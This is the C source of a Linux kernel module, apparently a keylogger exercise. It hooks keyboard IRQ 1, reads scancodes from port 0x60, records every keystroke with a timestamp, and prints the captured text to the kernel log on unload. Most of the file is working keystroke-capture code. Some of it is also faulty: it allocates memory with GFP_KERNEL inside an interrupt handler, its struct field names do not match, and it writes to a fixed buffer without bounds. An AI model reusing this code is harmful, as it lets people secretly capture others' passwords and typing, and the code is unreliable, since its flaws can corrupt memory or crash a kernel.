#include "keylog.h"
#include "keymap.h"


#define KEYBOARD_IRQ	1
#define SHIFT_L		42
#define SHIFT_R		54
#define CAPS_LOCK	58

#define BUF_SIZE PAGE_SIZE
/*
static struct s_stroke {
	unsigned char		key;
	unsigned char		state;
	char			name[25];
	char			value;
	struct tm		time;
	struct list_head	stroke_lst;
};

struct keyboard_map {
  int   key;
  int   ascii;
  char  str[25];
  int   ascii_shift;
  char  shift_str[25];
  bool  pressed;
};

*/
enum {
	RELEASED,
	PRESSED
};

struct list_head	head_stroke_lst_head;
char			line[BUF_SIZE];
bool 			shift = 0;
bool 			caps_lock = 0;

LIST_HEAD(head_stroke_lst);
/*			if (first) {
				snprintf(buffer, 80, "%i:%i:%i: ",
					strokes->time.tm_hour,
					strokes->time.tm_min,
					strokes->time.tm_sec);
				strncat(line, buffer, 80);
				memset(buffer, 0, 80);
				first = 0;
			}*/
/*
static int	chr_open(struct inode *node, struct file *file)
{
	return 0;
}

static int	chr_release(struct inode *node, struct file *file)
{
	return 0;
}

static ssize_t	chr_read(struct file *file, char __user *user,
			 size_t size, loff_t *offset)
{
	return simple_read_from_buffer(user, size, offset, user, size);
}

static struct file_operations const ops = {
	.read = chr_read,
};

static struct miscdevice misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "module_keyboard",
	.fops = &ops
};
*/
static irqreturn_t keyboard_handler (int irq, void *dev_id)
{
	static unsigned char scancode;
	struct s_stroke		*new;
	struct timespec ts;
	struct keyboard_map	*entry;

	getnstimeofday(&ts);
	new = kmalloc(sizeof(struct s_stroke), GFP_KERNEL);
	if (new) {
		scancode = inb (0x60);
		new->key =  scancode & 0x7f;
		entry = &keyboard_mapping[new->key];
		memset(new->name, 0, sizeof(new->name));
		memcpy(new->name, entry->str, strlen(entry->str));
		new->state = (scancode & 0x80) ? RELEASED : PRESSED;
		entry->pressed = new->state == PRESSED ? true : false;
		shift = keyboard_mapping[SHIFT_R].pressed | keyboard_mapping[SHIFT_L].pressed;
		new->value = shift ? entry->shift_ascii : entry->ascii;
		time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
		list_add(&new->stroke_lst, &head_stroke_lst);
	}
	return IRQ_HANDLED;
}

//		else if (((scancode & 0x7f) == CAPS_LOCK) && new->state == PRESSED) {
//			caps_lock = (caps_lock == RELEASED) ? PRESSED : RELEASED;
//		}
static int __init keyboard_irq_init(void)
{
	int ret;
//	int result;

//	result = misc_register(&misc);
//	if (result < 0) {
//		pr_err("chr register failed for the driver.\n");
//		return -1;
//	}
	ret = request_irq(KEYBOARD_IRQ, keyboard_handler, IRQF_SHARED,
			"keyboard", (void *)keyboard_handler);
	if (ret) {
		pr_err("can't get shared interrupt for keyboard\n");
		return -1;
	}
	printk (KERN_ERR "init okay!\n");
	return 0;
}

static void __exit keyboard_irq_exit(void)
{
	struct s_stroke		*strokes = NULL;
	char			buffer[80];

	memset(buffer, 0, 80);
	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		if (strokes->state == PRESSED) {
			if (isprint(strokes->value)) {
				line[strlen(line)] = strokes->value;
			}
			else if (strokes->value == 13) {
				pr_err("%s\n", line);
				memset(line, 0, PAGE_SIZE);
			}
		}
		kfree(strokes);
	}
	pr_err("%s\n", line);
//	misc_deregister(&misc);
	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("abonneca");
MODULE_DESCRIPTION("A keyboard irq module");

module_init(keyboard_irq_init);
module_exit(keyboard_irq_exit);
